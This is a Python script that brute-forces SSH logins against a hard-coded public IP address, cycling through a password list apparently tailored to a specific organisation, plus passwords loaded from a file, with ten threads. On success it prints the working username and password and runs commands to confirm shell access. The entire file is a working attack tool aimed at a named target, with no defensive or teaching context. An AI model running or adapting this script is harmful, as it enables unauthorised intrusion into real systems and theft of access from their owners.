import paramiko
import concurrent.futures
import socket
import sys
import time

TARGET = "46.183.184.105"
PORT = 22

# Intelligence-based User/Pass list
USERS = ["root", "admin", "ubuntu", "paragon", "support", "teemo", "postgres", "deploy"]
PASSWORDS = [
    "Paragon2019!", "Graphite2026!", "Unit8200#2026", "Schneorson@Paragon",
    "hr-seo2024", "hr-seo2025", "hr-seo2026", "seodomains2024!", "seodomains2025!",
    "Admin123!", "Ubuntu2024!", "P@ssw0rd123", "GraphiteSystem!", 
    "teemo", "Anjaymabar@123", "root", "12345678", "password",
    "seodomains.com.hr", "edisglobal"
]

# Load file passwords if they exist
try:
    with open("paragon_passwords.txt", "r") as f:
        PASSWORDS.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
except:
    pass

PASSWORDS = list(set(PASSWORDS)) # Dedup

def ssh_connect(creds):
    user, password = creds
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Fast fail timeout
        client.connect(TARGET, port=PORT, username=user, password=password, timeout=3, banner_timeout=3)
        print(f"\n[!!!] SHELL ACCESS GRANTED: {user}@{TARGET} | PW: {password}")
        # Execute a proof of life command
        stdin, stdout, stderr = client.exec_command("id; uname -a; hostname")
        print(stdout.read().decode())
        client.close()
        return True
    except paramiko.AuthenticationException:
        sys.stdout.write(".")
        sys.stdout.flush()
        return False
    except Exception as e:
        # sys.stdout.write("E")
        # sys.stdout.flush()
        return False
    finally:
        client.close()

def run():
    print(f"[*] FORCING ENTRY on {TARGET}:22...")
    print(f"[*] Users: {len(USERS)} | Passwords: {len(PASSWORDS)}")
    
    combos = [(u, p) for u in USERS for p in PASSWORDS]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(ssh_connect, c): c for c in combos}
        
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                print("[*] ATTACK SUCCESSFUL. TERMINATING.")
                sys.exit(0)
                
    print("\n[-] Attack exhaustion. No credentials valid.")

if __name__ == "__main__":
    run()
